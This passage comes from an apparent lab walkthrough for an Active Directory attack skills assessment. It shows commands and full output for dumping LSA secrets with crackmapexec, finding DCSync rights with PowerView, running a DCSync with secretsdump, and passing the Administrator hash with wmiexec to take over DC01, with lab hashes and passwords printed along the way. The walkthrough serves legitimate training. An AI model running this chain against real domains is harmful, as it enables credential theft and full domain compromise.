|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:49708-<><>-OK
SMB         172.16.6.50     445    MS01             [+] Executed command 
SMB         172.16.6.50     445    MS01             spn$_r0ast1ng_on_@n_0p3n_f1re
```

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 5

### "Find cleartext credentials for another domain user. Submit the username as your answer."

Students need to dump `autologon` passwords in clear text using `crackmapexec`, finding the user `tpetty`, as in `tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801` and `tpetty:Sup3rS3cur3D0m@inU2eR`:

Code: shell

```shell
proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
┌─[root@pwnbox-base]─[/home/htb-ac2]
└──╼ proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:135-<><>-OK
SMB         172.16.6.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
SMB         172.16.6.50     445    MS01             [+] Dumping LSA secrets
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:b98c9c990c7a08fadbc329c5fe59690a52835b24ef0233ad51af7d6a6338ddb8
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:2c4a51903a90716c11c54202ed74d040
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:des-cbc-md5:1f8c624601867632
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:plain_password_hex:5e006b00460029006e00460059006a005f006b0020005100640036003400520062005300400026002900280068006e004c0030004000780069003d00210051005d00740051005c006a0064004e004600780072006f007100750057006100400043006400540076005c00580072005e0072006b003b00470058007a00720024006d00480046004c003500600050002a003b003500640044005d00750036004e0063005f0039003500490054005c0031006a004e0030004d0067004f004a006b0022004000280037006a0048003100750034003f003300450059005f0037006f003800620035002d00660063004c003d00
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:ecfe27900016073fffef1bb4b2132bb2:::
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
SMB         172.16.6.50     445    MS01             dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786
dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19
SMB         172.16.6.50     445    MS01             NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
SMB         172.16.6.50     445    MS01             [+] Dumped 11 LSA secrets to /root/.cme/logs/MS01_172.16.6.50_2022-04-21_180332.secrets and /root/.cme/logs/MS01_172.16.6.50_2022-04-21_180332.cached
```

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 6

### "Submit this user's cleartext password."

Students need to dump `autologon` passwords in clear text using `crackmapexec`, finding the password `Sup3rS3cur3D0m@inU2eR` from the credentials `tpetty:Sup3rS3cur3D0m@inU2eR`:

Code: shell

```shell
proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
┌─[root@pwnbox-base]─[/home/htb-ac2]
└──╼ proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:135-<><>-OK
SMB         172.16.6.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
SMB         172.16.6.50     445    MS01             [+] Dumping LSA secrets
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:b98c9c990c7a08fadbc329c5fe59690a52835b24ef0233ad51af7d6a6338ddb8
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:2c4a51903a90716c11c54202ed74d040
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:des-cbc-md5:1f8c624601867632
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:plain_password_hex:5e006b00460029006e00460059006a005f006b0020005100640036003400520062005300400026002900280068006e004c0030004000780069003d00210051005d00740051005c006a0064004e004600780072006f007100750057006100400043006400540076005c00580072005e0072006b003b00470058007a00720024006d00480046004c003500600050002a003b003500640044005d00750036004e0063005f0039003500490054005c0031006a004e0030004d0067004f004a006b0022004000280037006a0048003100750034003f003300450059005f0037006f003800620035002d00660063004c003d00
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:ecfe27900016073fffef1bb4b2132bb2:::
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
SMB         172.16.6.50     445    MS01             dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786
dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19
SMB         172.16.6.50     445    MS01             NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
SMB         172.16.6.50     445    MS01             [+] Dumped 11 LSA secrets to /root/.cme/logs/MS01_172.16.6.50_2022-04-21_180332.secrets and /root/.cme/logs/MS01_172.16.6.50_2022-04-21_180332.cached
```

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 7

### "What attack can this user perform?"

Using the previously established meterpreter session on WEB01, students will drop to a command shell, navigate to `C:\`, and then run PowerShell:

Code: shell

```shell
shell
cd C:\
dir
powershell
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
(Meterpreter 1)(C:\windows\system32\inetsrv) > shell

Process 324 created.
Channel 23 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\windows\system32\inetsrv>cd C:\    
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DA7F-3F25

 Directory of C:\

03/30/2022  01:38 AM    <DIR>          inetpub
09/14/2018  11:12 PM    <DIR>          PerfLogs
11/23/2022  07:51 AM           770,279 PowerView.ps1
04/11/2022  04:54 PM    <DIR>          Program Files
03/30/2022  01:37 AM    <DIR>          Program Files (x86)
04/11/2022  04:26 PM    <DIR>          Users
04/11/2022  06:38 PM    <DIR>          Windows
               1 File(s)        770,279 bytes
               6 Dir(s)  34,472,337,408 bytes free

C:\>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\> 
```

Then, students need to use `PowerView` to enumerate attack vectors for `tpetty`:

Code: powershell

```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid tpetty
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

  AD Enumeration & Attacks - Skills Assessment Part I

```powershell-session
PS C:\> Import-Module .\PowerView.ps1

Import-Module .\PowerView.ps1
PS C:\> $sid = Convert-NameToSid tpetty
$sid = Convert-NameToSid tpetty
PS C:\> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes-All
```

Students will find that `tpetty` has `DCSync` rights.

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 8

### "Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01"

Students need to perform a `DCSync` attack to obtain the hash for for administrator on DC01:

Code: shell

```shell
proxychains sudo secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
└──╼ [★]$ proxychains sudo secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:445-<><>-OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:49667-<><>-OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:a76102a5617bffb1ea84ba0052767992823fd414697e81151f7de21bb41b1857
Administrator:aes128-cts-hmac-sha1-96:69e27df2550c5c270eca1d8ce5c46230
Administrator:des-cbc-md5:c2d9c892f2e6f2dc
[*] Cleaning up... 
```

Subsequently, students need to use `wmiexec.py` as `administrator` and pass the hash `aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0` to be able to connect to DC01. Students will find the flag in `C:\users\administrator\desktop\flag.txt`:

Code: shell

```shell
proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
hostname
type C:\users\administrator\desktop\flag.txt
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
└──╼ [★]$ proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:49774-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
DC01

C:\>type c:\users\administrator\desktop\flag.txt
r3plicat1on_m@st3r!
```

Answer: {hidden}